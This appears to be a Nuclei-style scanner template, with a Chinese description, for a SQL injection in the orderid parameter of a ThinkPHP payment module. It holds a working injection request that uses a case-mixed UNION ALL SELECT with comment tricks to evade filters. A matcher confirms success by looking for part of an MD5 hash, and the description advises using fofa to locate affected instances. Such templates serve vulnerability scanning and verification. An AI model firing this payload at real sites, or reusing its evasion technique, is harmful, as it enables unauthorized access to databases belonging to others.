id: thinkphp_pay_orderid_sqli

info:
  name: "ThinkPHP支付模块订单ID参数SQL注入"
  author: 0dayPoc
  severity: high
  description: |-
    该漏洞形成于ThinkPHP框架支付模块的订单ID参数处理逻辑中，攻击者可通过构造恶意订单ID值实现数据库查询语句污染。
      
      
      参考信息：
      - 漏洞利用需定位到支付接口处理流程
      - 影响范围覆盖未修复的历史版本
      - 建议通过fofa搜索引擎定位受影响实例
  tags: ThinkPHP

http:
- raw:
  - |
    GET /index.php?s=/home/pay/index/orderid/1%27)UnIoN/**/All/**/SeLeCT/**/Md5(2333)--+ HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '56540676a129760a'
